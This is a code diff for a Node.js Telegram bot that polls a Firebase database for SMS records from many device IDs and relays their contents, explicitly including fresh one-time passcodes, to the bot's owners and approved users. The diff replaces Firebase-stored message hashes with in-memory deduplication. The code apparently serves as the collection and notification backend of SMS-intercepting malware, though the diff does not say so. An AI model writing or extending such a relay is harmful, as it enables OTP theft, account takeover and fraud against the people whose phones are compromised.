@@ -32,8 +32,7 @@ let OFFSET = null;
 let running = true;
 const firebaseUrls = {};    // chatId -> firebaseUrl
 const watcherIntervals = {}; // chatId -> intervalId
-const seenHashes = {};       // chatId -> Set(hash) — backed by Firebase for persistence
-const seenHashesLoading = {}; // chatId -> Promise (prevents double-load race condition)
+const seenHashes = {};       // chatId -> Set(hash)
 const approvedUsers = new Set([...OWNER_IDS, ...APPROVED_IDS]);
 const BOT_START_TIME = Date.now() / 1000;
 const SENSITIVE_KEYS = {};
@@ -175,11 +174,11 @@ function findSmsNodes(snapshot, path = "") {
 function getRawTimestamp(obj) {
   let ts = obj.time || obj.timestamp || obj.date || obj.created_at || null;
   if (!ts) return 0;
-
+  
   if (typeof ts === "number") {
     return ts < 1e12 ? ts * 1000 : ts;
   }
-
+  
   if (typeof ts === "string") {
     ts = ts.trim();
     if (/^\d+$/.test(ts)) {
@@ -196,20 +195,20 @@ function getRawTimestamp(obj) {
       ampm = ampm.toLowerCase();
       if (ampm === "pm" && hr !== 12) hr += 12;
       if (ampm === "am" && hr === 12) hr = 0;
-
-      const monNames = { "jan": 0, "feb": 1, "mar": 2, "apr": 3, "may": 4, "jun": 5, "jul": 6, "aug": 7, "sep": 8, "oct": 9, "nov": 10, "dec": 11 };
+      
+      const monNames = {"jan":0, "feb":1, "mar":2, "apr":3, "may":4, "jun":5, "jul":6, "aug":7, "sep":8, "oct":9, "nov":10, "dec":11};
       const monthIdx = monNames[m.toLowerCase()] || 0;
 
       const dt = new Date(parseInt(y, 10), monthIdx, parseInt(d, 10), hr, parseInt(min, 10), parseInt(s, 10));
       return dt.getTime();
     }
-
+    
     // Fallback standard parse
     const parsed = Date.parse(ts);
     if (!isNaN(parsed)) return parsed;
   }
-
-  return 0;
+  
+  return 0; 
 }
 
 function extractFields(obj) {
@@ -303,14 +302,12 @@ async function notifyUserOwner(chatId, fields) {
   const deviceId = String(fields.device || "").trim();
   if (mutedDevices.has(deviceId)) return;
   const text = formatNotification(fields, chatId);
-
+  
   const dests = new Set([chatId, ...OWNER_IDS, ...approvedUsers]);
   await sendMsg([...dests], text);
 }
 
 // ---------- FIREBASE POLLING LOGIC (Triggered by Cron) ----------
-const MAX_SAVED_HASHES = 500; // Keep last N hashes in Firebase to avoid bloat
-
 async function getBaseUrlForApprovals(chatId, baseUrl) {
   return baseUrl.replace(/\/+$/, "").replace(/\.json$/, "");
 }
@@ -329,148 +326,62 @@ async function loadApprovedUsersFromDB(baseUrl) {
   isApprovedUsersLoaded = true;
 }
 
-// Load previously sent hashes from Firebase into memory
-async function loadSentHashesFromDB(baseUrl) {
-  try {
-    const dbUrl = baseUrl.replace(/\/+$/, "").replace(/\.json$/, "");
-    const snap = await httpGetJson(`${dbUrl}/bot_state/sent_hashes.json`);
-    if (snap && typeof snap === 'object') {
-      // snap is { "hash1": timestamp, "hash2": timestamp, ... }
-      return new Set(Object.keys(snap));
-    }
-  } catch (e) {
-    console.log("loadSentHashesFromDB error:", e.message);
-  }
-  return new Set();
-}
-
-// Batch-save multiple new hashes to Firebase in a single PATCH call (atomic, no race conditions)
-async function saveSentHashesToDB(baseUrl, newHashes, existingHashes) {
-  if (newHashes.size === 0) return;
-  try {
-    const dbUrl = baseUrl.replace(/\/+$/, "").replace(/\.json$/, "");
-    const hashesNode = `${dbUrl}/bot_state/sent_hashes`;
-
-    // Prune oldest if over limit
-    if (existingHashes.size >= MAX_SAVED_HASHES) {
-      const snap = await httpGetJson(`${hashesNode}.json`);
-      if (snap && typeof snap === 'object') {
-        const entries = Object.entries(snap).sort((a, b) => a[1] - b[1]);
-        const toDelete = entries.slice(0, entries.length - MAX_SAVED_HASHES + newHashes.size);
-        for (const [oldHash] of toDelete) {
-          await httpDelete(`${hashesNode}/${oldHash}.json`);
-          existingHashes.delete(oldHash);
-        }
-      }
-    }
-
-    // Build a single PATCH payload for all new hashes — atomic single write
-    const now = Date.now();
-    const payload = {};
-    for (const h of newHashes) {
-      payload[h] = now;
-    }
-    // Firebase PATCH = merge update (won't delete existing keys)
-    await fetch(`${hashesNode}.json`, {
-      method: 'PATCH',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
-      timeout: 10000
-    });
-  } catch (e) {
-    console.log("saveSentHashesToDB error:", e.message);
-  }
-}
-
 async function pollFirebaseIteration(chatId, baseUrl) {
   // Load approved users on first iteration
   await loadApprovedUsersFromDB(baseUrl);
 
   let url = baseUrl.replace(/\/+$/, "");
   if (!url.endsWith(".json")) url = url + "/.json";
-
-  // Load sent hashes from Firebase if not already in memory.
-  // Use a Promise lock (seenHashesLoading) to prevent a double-load race condition
-  // when two cron calls hit the same cold Vercel instance simultaneously.
-  let isFirstEverRun = false;
+  
+  let isFirstRun = false;
   if (!seenHashes[chatId]) {
-    if (!seenHashesLoading[chatId]) {
-      console.log(`Loading sent_hashes from Firebase for chatId ${chatId}...`);
-      seenHashesLoading[chatId] = loadSentHashesFromDB(baseUrl).then(result => {
-        seenHashes[chatId] = result;
-        console.log(`Loaded ${seenHashes[chatId].size} hashes from Firebase.`);
-      });
-    }
-    // Wait for load to finish (avoids race if called twice before first load completes)
-    await seenHashesLoading[chatId];
-    // If Firebase had NO hashes stored, this is truly the first ever run
-    if (seenHashes[chatId].size === 0) {
-      isFirstEverRun = true;
-      console.log("First ever run detected — will silently seed existing messages, no notifications sent.");
-    }
+    seenHashes[chatId] = new Set();
+    isFirstRun = true;
   }
   const seen = seenHashes[chatId];
-
+  
   const snap = await httpGetJson(url);
   if (!snap) return;
-
+  
   const nodes = findSmsNodes(snap, "");
-  const newHashes = new Set(); // Collect all NEW hashes this run
-
   for (const [path, obj] of nodes) {
     const h = computeHash(path, obj);
-    if (seen.has(h)) continue; // Already sent — skip!
-
-    // Mark as seen in memory immediately
+    if (seen.has(h)) continue;
     seen.add(h);
-    newHashes.add(h);
-
-    if (isFirstEverRun) {
-      // Silent seed: just collect hash, don't notify (prevents old message flood on first deploy)
-      continue;
+    
+    // Only notify if this is NOT the first run of the server instance,
+    // OR if it IS but the message arrived in the last 3 minutes!
+    // (This guarantees real-time OTPs are sent even when Vercel is cold-booting,
+    //  while still blocking the thousands of old messages from yesterday).
+    if (!isFirstRun) {
+      const fields = extractFields(obj);
+      await notifyUserOwner(chatId, fields);
+    } else {
+      const rawTs = getRawTimestamp(obj);
+      const ageMs = Date.now() - rawTs;
+      // If message is newer than 3 minutes, notify even on cold boot!
+      if (rawTs > 0 && ageMs < 3 * 60 * 1000) {
+        const fields = extractFields(obj);
+        await notifyUserOwner(chatId, fields);
+      }
     }
-
-    // Send the notification
-    const fields = extractFields(obj);
-    await notifyUserOwner(chatId, fields);
-  }
-
-  // Save ALL new hashes to Firebase in a single atomic PATCH call
-  // This is the KEY fix: one reliable write instead of many small writes that can fail
-  if (newHashes.size > 0) {
-    await saveSentHashesToDB(baseUrl, newHashes, seen);
-    console.log(`Saved ${newHashes.size} new hash(es) to Firebase.`);
   }
 }
 
 // ---------- START / STOP ----------
 async function startWatcher(chatId, baseUrl) {
   firebaseUrls[chatId] = baseUrl;
-  // Load existing sent hashes from Firebase (don't reset to empty Set!)
-  // Resetting to empty would cause all old messages to be re-sent
-  if (!seenHashes[chatId]) {
-    console.log(`startWatcher: Loading sent_hashes from Firebase for chatId ${chatId}...`);
-    seenHashes[chatId] = await loadSentHashesFromDB(baseUrl);
-    console.log(`startWatcher: Loaded ${seenHashes[chatId].size} hashes.`);
-  }
-
-  // Also seed current Firebase contents silently (catch-up without notification)
+  seenHashes[chatId] = new Set();
   const jsonUrl = normalizeJsonUrl(baseUrl);
   const snap = await httpGetJson(jsonUrl);
+  
+  // Initially populate seenHashes so we don't alert old messages
   if (snap) {
-    const newSeed = new Set();
     for (const [p, o] of findSmsNodes(snap, "")) {
-      const h = computeHash(p, o);
-      if (!seenHashes[chatId].has(h)) {
-        seenHashes[chatId].add(h);
-        newSeed.add(h);
-      }
-    }
-    if (newSeed.size > 0) {
-      await saveSentHashesToDB(baseUrl, newSeed, seenHashes[chatId]);
+      seenHashes[chatId].add(computeHash(p, o));
     }
   }
-
+  
   await sendMsg(chatId, "✅ Monitoring started. You will receive alerts too.");
   refreshFirebaseCache(chatId);
 }
@@ -666,19 +577,19 @@ async function handleUpdate(u) {
     await sendMsg(
       chatId,
       "👋 Welcome!\n\n" +
-      "You are approved to use this bot.\n\n" +
-      "User Commands:\n" +
-      "• /start - show this message\n" +
-      "• /stop - stop your monitoring\n" +
-      "• /find <device_id> - search record by device id (safe summary only)\n" +
-      "• /ping - bot status & ping\n" +
-      "• /mute <device_id> - mute a specific device\n" +
-      "• /unmute <device_id> - unmute a specific device\n" +
-      "\nAdmin Commands (owners only):\n" +
-      "• /adminlist - show active Firebase URL\n" +
-      "• /approve <user_id> - permanently approve user\n" +
-      "• /unapprove <user_id> - permanently unapprove user\n" +
-      "• /approvedlist - show approved users"
+        "You are approved to use this bot.\n\n" +
+        "User Commands:\n" +
+        "• /start - show this message\n" +
+        "• /stop - stop your monitoring\n" +
+        "• /find <device_id> - search record by device id (safe summary only)\n" +
+        "• /ping - bot status & ping\n" +
+        "• /mute <device_id> - mute a specific device\n" +
+        "• /unmute <device_id> - unmute a specific device\n" +
+        "\nAdmin Commands (owners only):\n" +
+        "• /adminlist - show active Firebase URL\n" +
+        "• /approve <user_id> - permanently approve user\n" +
+        "• /unapprove <user_id> - permanently unapprove user\n" +
+        "• /approvedlist - show approved users"
     );
     return;
   }
@@ -738,13 +649,13 @@ async function handleUpdate(u) {
       await sendMsg(chatId, "❌ Invalid user ID.");
       return;
     }
-
+    
     approvedUsers.add(targetId);
     if (SINGLE_FIREBASE_URL) {
       const dbUrl = await getBaseUrlForApprovals(chatId, SINGLE_FIREBASE_URL);
       await httpPutJson(`${dbUrl}/approved_users/${targetId}.json`, true);
     }
-
+    
     await sendMsg(chatId, `✅ User <code>${targetId}</code> approved and saved permanently.`);
     await sendMsg(targetId, "✅ You have been approved to use this bot.");
     return;
@@ -769,7 +680,7 @@ async function handleUpdate(u) {
       await sendMsg(chatId, "❌ Cannot unapprove an owner.");
       return;
     }
-
+    
     if (approvedUsers.has(targetId)) {
       approvedUsers.delete(targetId);
       if (SINGLE_FIREBASE_URL) {
@@ -876,17 +787,17 @@ async function handleUpdate(u) {
   await sendMsg(
     chatId,
     "User Commands:\n" +
-    "• /start - instructions\n" +
-    "• /stop - stop your monitoring\n" +
-    "• /find <device_id> - search record by device id (safe summary only)\n" +
-    "• /ping - bot status & ping\n" +
-    "• /mute <device_id> - mute a specific device\n" +
-    "• /unmute <device_id> - unmute a specific device\n" +
-    "\nAdmin Commands:\n" +
-    "• /adminlist - show active Firebase URL\n" +
-    "• /approve <user_id> - permanently approve user\n" +
-    "• /unapprove <user_id> - permanently unapprove user\n" +
-    "• /approvedlist - show approved users"
+      "• /start - instructions\n" +
+      "• /stop - stop your monitoring\n" +
+      "• /find <device_id> - search record by device id (safe summary only)\n" +
+      "• /ping - bot status & ping\n" +
+      "• /mute <device_id> - mute a specific device\n" +
+      "• /unmute <device_id> - unmute a specific device\n" +
+      "\nAdmin Commands:\n" +
+      "• /adminlist - show active Firebase URL\n" +
+      "• /approve <user_id> - permanently approve user\n" +
+      "• /unapprove <user_id> - permanently unapprove user\n" +
+      "• /approvedlist - show approved users"
   );
 }
 
@@ -949,7 +860,7 @@ app.get("/set_webhook", async (req, res) => {
 app.get("/cron", async (req, res) => {
   try {
     let polledCount = 0;
-
+    
     // Approach 1: Stateless check (Using Hardcoded Firebase URL)
     if (SINGLE_FIREBASE_URL && SINGLE_ADMIN_CHAT_ID) {
       await pollFirebaseIteration(SINGLE_ADMIN_CHAT_ID, SINGLE_FIREBASE_URL);
@@ -961,7 +872,7 @@ app.get("/cron", async (req, res) => {
     for (const chatId of activeChats) {
       // Don't double-poll if the hardcoded match is also in memory
       if (SINGLE_ADMIN_CHAT_ID == chatId && SINGLE_FIREBASE_URL == firebaseUrls[chatId]) continue;
-
+      
       await pollFirebaseIteration(chatId, firebaseUrls[chatId]);
       polledCount++;
     }
